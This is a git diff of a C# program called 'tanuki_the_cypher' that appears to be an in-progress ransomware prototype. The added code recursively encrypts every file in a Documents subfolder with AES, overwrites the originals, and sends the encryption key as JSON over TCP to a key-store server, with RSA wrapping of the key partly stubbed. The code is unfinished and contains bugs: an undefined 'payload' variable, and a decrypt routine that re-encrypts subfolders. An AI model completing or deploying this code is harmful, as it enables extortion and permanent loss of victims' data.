@@ -1,45 +1,95 @@
-﻿using Microsoft.Win32;
-using System;
-using System.Collections.Generic;
+﻿using System;
+using System.ComponentModel;
 using System.IO;
-using System.Linq;
-using System.Runtime.InteropServices;
 using System.Security.Cryptography;
+using System.Numerics;
+using System.Net.Sockets;
 using System.Text;
-using System.Threading.Tasks;
+using System.Text.Json;
 
 namespace tanuki_the_cypher
 {
     class Program
     {
-        
-
         static void Main(string[] args)
         {
-            string folder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-            string target = folder + "\\test.txt";
+            string folder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\esempio";
 
-            foreach (var path in Directory.GetFiles(folder))
+            byte[] key = null;
+            byte[] iv = null;
+            using (Aes aes = Aes.Create())
             {
-                Console.WriteLine(path); // full path
-                Console.WriteLine(System.IO.Path.GetFileName(path)); // file name
+                key = aes.Key;
+                iv = aes.IV;
+            }
+
+            //EncryptFiles(folder, key, iv);
+
+            RSA rsa = RSA.Create();
+
+
+            TcpClient client;
+            NetworkStream stream;
+            client = new TcpClient("localhost", 6000);
+            stream = client.GetStream();
+
+            Packets.Request.SendKey sendKey = new Packets.Request.SendKey() { Operation = "keyStore", Key = Encoding.Default.GetString(key) };
+            string sendKey_Json = JsonSerializer.Serialize<Packets.Request.SendKey>(sendKey);
+            byte[] request_bytes = Encoding.ASCII.GetBytes(sendKey_Json.ToString());
+            Console.WriteLine("JSON: " + sendKey_Json);
+            //byte[] payload = RSAEncrypt(request_bytes, RSAParams, false);
+
+            try
+            {
+                stream.Write(payload, 0, payload.Length);
+                Console.WriteLine("Message sent");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error sendig message: " + ex.Message);
             }
 
             Console.ReadLine();
 
-            byte[] encrypted = null;
-            byte[] key, iv;
-            Compare compare = new Compare();
 
-            Console.WriteLine(compare.Equality(File.ReadAllBytes(folder + "\\test.txt"), 
-                Encoding.ASCII.GetBytes(File.ReadAllText(folder + "\\test.txt"))));
+
+            //RSAEncrypt(key, );
+
+            //DecryptFiles(folder, key, iv);
+
+        }
+
+        static public void EncryptFiles(string sourceFolder, byte[] key, byte[] iv)
+        {
+            if (!Directory.Exists(sourceFolder)) { return; }
+
+            string[] files = Directory.GetFiles(sourceFolder);
+            foreach (string file in files)
+            {
+                string content = File.ReadAllText(file);
+                byte[] encrypted = Encrypt(content, key, iv);
+                File.WriteAllBytes(file, encrypted);
+            }
+
+            string[] folders = Directory.GetDirectories(sourceFolder);
+            foreach (string folder in folders)
+            {
+                EncryptFiles(folder, key, iv);
+            }
+        }
+
+        static public byte[] Encrypt(string content, byte[] key, byte[] iv)
+        {
+            byte[] encrypted = null;
 
             using (Aes aesAlg = Aes.Create())
             {
+                aesAlg.Key = key;
+                aesAlg.IV = iv;
+                aesAlg.Padding = PaddingMode.PKCS7;
+
                 // Create an encryptor to perform the stream transform.
                 ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
-                key = aesAlg.Key;
-                iv = aesAlg.IV;
 
                 // Create the streams used for encryption.
                 using (MemoryStream msEncrypt = new MemoryStream())
@@ -49,29 +99,52 @@ namespace tanuki_the_cypher
                         using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                         {
                             //Write all data to the stream.
-                            swEncrypt.Write(File.ReadAllText(folder + "\\test.txt"));
+                            swEncrypt.Write(content);
                         }
                         encrypted = msEncrypt.ToArray();
                     }
                 }
             }
-            File.WriteAllBytes(folder + "\\test_encrypted.txt", encrypted);
+            return encrypted;
+        }
 
-            //---------------------------------------//
+        static public void DecryptFiles(string sourceFolder, byte[] key, byte[] iv)
+        {
+            if (!Directory.Exists(sourceFolder)) { return; }
 
+            string[] files = Directory.GetFiles(sourceFolder);
+            foreach (string file in files)
+            {
+                byte[] content = File.ReadAllBytes(file);
+                string plainText = Decrypt(content, key, iv);
+                File.WriteAllText(file, plainText);
+            }
+
+            string[] folders = Directory.GetDirectories(sourceFolder);
+            foreach (string folder in folders)
+            {
+                EncryptFiles(folder, key, iv);
+            }
+        }
+
+        static public string Decrypt(byte[] content, byte[] key, byte[] iv)
+        {
             string plaintext = null;
+
+            // Create an Aes object
+            // with the specified key and IV.
             using (Aes aesAlg = Aes.Create())
             {
                 aesAlg.Key = key;
                 aesAlg.IV = iv;
+                aesAlg.Padding = PaddingMode.PKCS7;
 
                 // Create a decryptor to perform the stream transform.
                 ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
 
                 // Create the streams used for decryption.
-                using (MemoryStream msDecrypt = new MemoryStream(File.ReadAllBytes(folder + "\\test_encrypted.txt")))
+                using (MemoryStream msDecrypt = new MemoryStream(content))
                 {
-                    Console.WriteLine(File.ReadAllBytes(folder + "\\test_encrypted.txt").Length);
                     using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                     {
                         using (StreamReader srDecrypt = new StreamReader(csDecrypt))
@@ -84,32 +157,45 @@ namespace tanuki_the_cypher
                     }
                 }
             }
-            Console.WriteLine(plaintext);
-            File.WriteAllText(folder + "\\test_decrypted.txt", plaintext);
-            Console.ReadLine();
 
+            return plaintext;
         }
-    }
 
-    class Compare
-    {
-        public bool Equality(byte[] a1, byte[] b1)
+        public static byte[] RSAEncrypt(byte[] DataToEncrypt, RSAParameters RSAKeyInfo, bool DoOAEPPadding)
         {
-            int i;
-            if (a1.Length == b1.Length)
+            
+            try
             {
-                i = 0;
-                while (i < a1.Length && (a1[i] == b1[i])) //Earlier it was a1[i]!=b1[i]
+                byte[] encryptedData;
+                //Create a new instance of RSACryptoServiceProvider.
+                using (RSACryptoServiceProvider RSA = new RSACryptoServiceProvider())
                 {
-                    i++;
-                }
-                if (i == a1.Length)
-                {
-                    return true;
-                }
-            }
 
-            return false;
+                    //Import the RSA Key information. This only needs
+                    //toinclude the public key information.
+                    RSA.ImportParameters(RSAKeyInfo);
+                    
+                    //Encrypt the passed byte array and specify OAEP padding.  
+                    //OAEP padding is only available on Microsoft Windows XP or
+                    //later.  
+                    encryptedData = RSA.Encrypt(DataToEncrypt, DoOAEPPadding);
+                }
+                return encryptedData;
+            }
+            //Catch and display a CryptographicException  
+            //to the console.
+            catch (CryptographicException e)
+            {
+                Console.WriteLine(e.Message);
+
+                return null;
+            }
+        }
+
+        static public void SendKey()
+        {
+
         }
     }
+
 }
